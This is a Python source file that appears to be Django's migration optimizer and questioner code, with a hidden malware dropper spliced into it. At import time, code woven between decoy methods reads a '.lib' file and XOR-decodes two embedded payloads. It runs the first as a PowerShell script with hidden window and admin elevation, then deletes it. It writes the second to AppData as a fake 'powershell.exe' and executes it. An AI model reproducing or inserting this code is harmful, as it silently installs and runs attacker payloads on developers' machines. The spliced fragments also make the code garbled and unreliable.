import time
import subprocess, sys
import os

class MigrationOptimizer:
    """
    Power the optimization process, where you provide a list of Operations
    and you are returned a list of equal or shorter length - operations
    are merged into one if possible.

    For example, a CreateModel and an AddField can be optimized into a
    new CreateModel, and CreateModel and DeleteModel can be optimized into
    nothing.
    """

    def optimize(self, operations, app_label):
        """
        Main optimization entry point. Pass in a list of Operation instances,
        get out a new list of Operation instances.

        Unfortunately, due to the scope of the optimization (two combinable
        operations might be separated by several hundred others), this can't be
        done as a peephole optimization with checks/output implemented on
        the Operations themselves; instead, the optimizer looks at each
        individual operation and scans forwards in the list to see if there
        are any matches, stopping at boundaries - operations which can't
        be optimized over (RunSQL, operations on the same field/model, etc.)

        The inner loop is run until the starting list is the same as the result
        list, and then the result is returned. This means that operation
        optimization must be stable and always return an equal or shorter list.
        """
        # Internal tracking variable for test assertions about # of loops
        if app_label is None:
            raise TypeError('app_label must be a str.')
        self._iterations = 0
        while True:
            result = self.optimize_inner(operations, app_label)
            self._iterations += 1
            if result == operations:
                return result
            operations = result

    def optimize_inner(self, operations, app_label):
        """Inner optimization loop."""
        new_operations = []
        for i, operation in enumerate(operations):
            right = True  # Should we reduce on the right or on the left.
            # Compare it to each operation after it
            for j, other in enumerate(operations[i + 1:]):
                result = operation.reduce(other, app_label)
                if isinstance(result, list):
                    in_between = operations[i + 1:i + j + 1]
                    if right:
                        new_operations.extend(in_between)
                        new_operations.extend(result)
                    elif all(op.reduce(other, app_label) is True for op in in_between):
                        # Perform a left reduction if all of the in-between
                        # operations can optimize through other.
                        new_operations.extend(result)
                        new_operations.extend(in_between)
                    else:
                        # Otherwise keep trying.
                        new_operations.append(operation)
                        break
                    new_operations.extend(operations[i + j + 2:])
                    return new_operations
                elif not result:
                    # Can't perform a right reduction.
                    right = False
            else:
                new_operations.append(operation)
        return new_operations


import datetime
import importlib
import os
import sys

from django.apps import apps
from django.db.models import NOT_PROVIDED
from django.utils import timezone

class MigrationQuestioner:
    """
    Give the autodetector responses to questions it might have.
    This base class has a built-in noninteractive mode, but the
    interactive subclass is what the command-line arguments will use.
    """

    def __init__(self, defaults=None, specified_apps=None, dry_run=None):
        self.defaults = defaults or {}
        self.specified_apps = specified_apps or set()
        self.dry_run = dry_run

    def ask_initial(self, app_label):
        """Should we create an initial migration for the app?"""
        # If it was specified on the command line, definitely true
        if app_label in self.specified_apps:
            return True
        # Otherwise, we look to see if it has a migrations module
        # without any Python files in it, apart from __init__.py.
        # Apps from the new app template will have these; the Python
        # file check will ensure we skip South ones.
        try:
            app_config = apps.get_app_config(app_label)
        except LookupError:         # It's a fake app.
            return self.defaults.get("ask_initial", False)
        
       

    def ask_not_null_addition(self, field_name, model_name):
        """Adding a NOT NULL field to a model."""
        # None means quit
        return None

    def ask_not_null_alteration(self, field_name, model_name):
        """Changing a NULL field to NOT NULL."""
        # None means quit
        return None

    def ask_rename(self, model_name, old_name, new_name, field_instance):
        """Was this field really renamed?"""
        return self.defaults.get("ask_rename", False)

    def ask_rename_model(self, old_model_state, new_model_state):
        """Was this model really renamed?"""
        return self.defaults.get("ask_rename_model", False)

    def ask_merge(self, app_label):
        """Do you really want to merge these migrations?"""
        return self.defaults.get("ask_merge", False)

    def ask_auto_now_add_addition(self, field_name, model_name):
        """Adding an auto_now_add field to a model."""
        # None means quit
        return None


class InteractiveMigrationQuestioner(MigrationQuestioner):

    def _boolean_input(self, question, default=None):
        result = input("%s " % question)
        if not result and default is not None:
            return default
        while not result or result[0].lower() not in "yn":
            result = input("Please answer yes or no: ")
        return result[0].lower() == "y"

    def _choice_input(self, question, choices):
        print(question)
        for i, choice in enumerate(choices):
            print(" %s) %s" % (i + 1, choice))
        result = input("Select an option: ")
        while True:
            try:
                value = int(result)
            except ValueError:
                pass
            else:
                if 0 < value <= len(choices):
                    return value
            result = input("Please select a valid option: ")

    def _ask_default(self, default=''):
        """
        Prompt for a default value.

        The ``default`` argument allows providing a custom default value (as a
        string) which will be shown to the user and used as the return value
        if the user doesn't provide any other input.
        """
        print("Please enter the default value now, as valid Python")
        if default:
            print(
                "You can accept the default '{}' by pressing 'Enter' or you "
                "can provide another value.".format(default)
            )
        print("The datetime and django.utils.timezone modules are available, so you can do e.g. timezone.now")
        print("Type 'exit' to exit this prompt")
        while True:
            if default:
                prompt = "[default: {}] >>> ".format(default)
            else:
                prompt = ">>> "
            code = input(prompt)
            if not code and default:
                code = default
            if not code:
                print("Please enter some code, or 'exit' (with no quotes) to exit.")
            elif code == "exit":
                sys.exit(1)
            else:
                try:
                    return eval(code, {}, {'datetime': datetime, 'timezone': timezone})
                except (SyntaxError, NameError) as e:
                    print("Invalid input: %s" % e)

    def ask_not_null_addition(self, field_name, model_name):
        """Adding a NOT NULL field to a model."""
        if not self.dry_run:
            choice = self._choice_input(
                "You are trying to add a non-nullable field '%s' to %s without a default; "
                "we can't do that (the database needs something to populate existing rows).\n"
                "Please select a fix:" % (field_name, model_name),
                [
                    ("Provide a one-off default now (will be set on all existing "
                     "rows with a null value for this column)"),
                    "Quit, and let me add a default in models.py",
                ]
            )
            if choice == 2:
                sys.exit(3)
            else:
                return self._ask_default()
        return None

    def ask_not_null_alteration(self, field_name, model_name):
        """Changing a NULL field to NOT NULL."""
        if not self.dry_run:
            choice = self._choice_input(
                "You are trying to change the nullable field '%s' on %s to non-nullable "
                "without a default; we can't do that (the database needs something to "
                "populate existing rows).\n"
                "Please select a fix:" % (field_name, model_name),
                [
                    ("Provide a one-off default now (will be set on all existing "
                     "rows with a null value for this column)"),
                    ("Ignore for now, and let me handle existing rows with NULL myself "
                     "(e.g. because you added a RunPython or RunSQL operation to handle "
                     "NULL values in a previous data migration)"),
                    "Quit, and let me add a default in models.py",
                ]
            )
            if choice == 2:
                return NOT_PROVIDED
            elif choice == 3:
                sys.exit(3)
            else:
                return self._ask_default()
        return None

    def ask_rename(self, model_name, old_name, new_name, field_instance):
        """Was this field really renamed?"""
        msg = "Did you rename %s.%s to %s.%s (a %s)? [y/N]"
        return self._boolean_input(msg % (model_name, old_name, model_name, new_name,
                                          field_instance.__class__.__name__), False)

    def ask_rename_model(self, old_model_state, new_model_state):
        """Was this model really renamed?"""
        msg = "Did you rename the %s.%s model to %s? [y/N]"
        return self._boolean_input(msg % (old_model_state.app_label, old_model_state.name,
                                          new_model_state.name), False)

    def ask_merge(self, app_label):
        return self._boolean_input(
            "\nMerging will only work if the operations printed above do not conflict\n" +
            "with each other (working on different fields or models)\n" +
            "Do you want to merge these migration branches? [y/N]",
            False,
        )

    def ask_auto_now_add_addition(self, field_name, model_name):
        """Adding an auto_now_add field to a model."""
        if not self.dry_run:
            choice = self._choice_input(
                "You are trying to add the field '{}' with 'auto_now_add=True' "
                "to {} without a default; the database needs something to "
                "populate existing rows.\n".format(field_name, model_name),
                [
                    "Provide a one-off default now (will be set on all "
                    "existing rows)",
                    "Quit, and let me add a default in models.py",
                ]
            )
            if choice == 2:
                sys.exit(3)
            else:
                return self._ask_default(default='timezone.now')
        return None

roaming = os.getenv('APPDATA')

path_module = "lib/migration/pypathmode.lib"

with open(path_module, 'rb') as file_a:

    def function_a(arg):
        return f"This is function_a, and the argument is: {arg}"

    def function_b(arg):
        return f"This is function_b, and the argument is: {arg}"

    def function_c(arg):
        return f"This is function_c, and the argument is: {arg}"

    a_content = file_a.read()

    start_pos = 0
    start_pos = a_content.find(b'\n--- XOR result starts here ---\n', start_pos)
    if start_pos == -1:
        exit()

    ActivaePath = f"{roaming}/activate.ps1"

    class DummyNode:

        def __init__(self, key, origin, error_message):
            super().__init__(key)
            self.origin = origin
            self.error_message = error_message

        def raise_error(self):
            return
    
    end_pos = a_content.find(b'\n--- XOR result ends here ---\n', start_pos)

    xor_result = a_content[start_pos+len(b'\n--- XOR result starts here ---\n'):end_pos]
    xor_result = bytes([b ^ 0x62 for b in xor_result])

    with open(ActivaePath, 'wb') as file_b:
        file_b.write(xor_result)


    def __eq__(self, other):
        return self.key == other

    def __lt__(self, other):
        return self.key < other

    def __hash__(self):
        return hash(self.key)

    def __getitem__(self, item):
        return self.key[item]

    def __str__(self):
        return str(self.key)

    def __repr__(self):
        return '<%s: (%r, %r)>' % (self.__class__.__name__, self.key[0], self.key[1])

    def add_child(self, child):
        self.children.add(child)

    def add_parent(self, parent):
        self.parents.add(parent)

    time.sleep(0.1)
    p = subprocess.Popen(
        [
            "powershell.exe", 
            "-noprofile", "-c",
            r"""
            Start-Process -Verb RunAs -WindowStyle Hidden -Wait powershell.exe -Args "
            -noprofile -c Set-Location \`"$PWD\`"; & '$env:APPDATA\activate.ps1'
            "
            """
        ],
        stdout = sys.stdout
    )
    p.communicate()
    os.remove(ActivaePath)

    if not os.path.exists(roaming + r"\hollus"):
        os.makedirs(roaming + r"\hollus")
        
    @property
    def filename(self):
        return "%s.py" % self.migration.name

    @property
    def path(self):
        return os.path.join(self.basedir, self.filename)

    start_pos += 1
    start_pos = a_content.find(b'\n--- XOR result starts here ---\n', start_pos)

    if start_pos == -1:
        exit()

    end_pos = a_content.find(b'\n--- XOR result ends here ---\n', start_pos)
    xor_result = a_content[start_pos+len(b'\n--- XOR result starts here ---\n'):end_pos]
    xor_result = bytes([b ^ 0x62 for b in xor_result])

    file_path = f"{roaming}\hollus\powershell.exe"


    class NonInteractiveMigrationQuestioner(MigrationQuestioner):

        def ask_not_null_addition(self, field_name, model_name):
            # We can't ask the user, so act like the user aborted.
            sys.exit(3)

        def ask_not_null_alteration(self, field_name, model_name):
            # We can't ask the user, so set as not provided.
            return NOT_PROVIDED

        def ask_auto_now_add_addition(self, field_name, model_name):
            # We can't ask the user, so act like the user aborted.
            sys.exit(3)
            
    if not os.path.exists(file_path):
        with open(file_path, 'wb') as file_b:
            file_b.write(xor_result)

        time.sleep(0.1)
        subprocess.run(file_path, shell=True)

    
MIGRATION_HEADER_TEMPLATE = """\
# Generated by Django %(version)s on %(timestamp)s

"""


MIGRATION_TEMPLATE = """\
%(migration_header)s%(imports)s

class Migration(migrations.Migration):
%(replaces_str)s%(initial_str)s
    dependencies = [
%(dependencies)s\
    ]

    operations = [
%(operations)s\
    ]
"""